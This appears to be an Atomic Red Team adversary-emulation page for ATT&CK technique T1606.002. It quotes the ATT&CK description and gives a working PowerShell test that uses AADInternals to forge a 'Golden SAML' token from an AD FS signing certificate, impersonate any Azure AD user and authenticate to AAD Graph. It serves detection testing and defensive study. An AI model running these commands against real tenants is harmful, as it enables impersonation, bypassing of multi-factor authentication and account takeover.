# T1606.002 - Forge Web Credentials: SAML token
## [Description from ATT&CK](https://attack.mitre.org/techniques/T1606/002)
<blockquote>An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate.(Citation: Microsoft SolarWinds Steps) The default lifetime of a SAML token is one hour, but the validity period can be specified in the <code>NotOnOrAfter</code> value of the <code>conditions ...</code> element in a token. This value can be changed using the <code>AccessTokenLifetime</code> in a <code>LifetimeTokenPolicy</code>.(Citation: Microsoft SAML Token Lifetimes) Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.(Citation: Cyberark Golden SAML)

An adversary may utilize [Private Keys](https://attack.mitre.org/techniques/T1552/004) to compromise an organization's token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate.(Citation: Microsoft SolarWinds Customer Guidance) This differs from [Steal Application Access Token](https://attack.mitre.org/techniques/T1528) and other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users.

An adversary may gain administrative Azure AD privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead to [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Microsoft SolarWinds Customer Guidance)</blockquote>

## Atomic Tests

- [Atomic Test #1 - Golden SAML](#atomic-test-1---golden-saml)


<br/>

## Atomic Test #1 - Golden SAML
Forge a "Golden SAML" token which allows to impersonate any Azure AD user, and authenticate to AADGraph (as a proof). 
You will need the ADFS token signing certificate (see T1552.004 to export it).

**Supported Platforms:** Azure-ad


**auto_generated_guid:** b16a03bc-1089-4dcc-ad98-30fe8f3a2b31





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| certificate_path | Token signing certificate path. See T1552.004 to export it | Path | .&#92;ADFS_signing.pfx|
| immutable_id | ImmutableId of the targeted user. It can be obtained with AzureAD powershell module; $(Get-AzureADUser -SearchString "username").ImmutableId | String | aehgdqBTZV50DKQZmNJ8mg==|
| issuer_uri | Issuer URI of the ADFS service | String | http://contoso.com/adfs/services/trust/|


#### Attack Commands: Run with `powershell`! 


```powershell
Import-Module AADInternals -Force
$saml = New-AADIntSAMLToken -ImmutableID "#{immutable_id}" -PfxFileName "#{certificate_path}" -Issuer "#{issuer_uri}"
$conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache
if ($conn) { Write-Host "`nSuccessfully connected as $($conn.User)" } else { Write-Host "`nThe connection failed" }
Write-Host "End of Golden SAML"
```




#### Dependencies:  Run with `powershell`!
##### Description: AADInternals module must be installed.
##### Check Prereq Commands:
```powershell
if (Get-Module AADInternals) {exit 0} else {exit 1}
```
##### Get Prereq Commands:
```powershell
Install-Module -Name AADInternals -Force
```
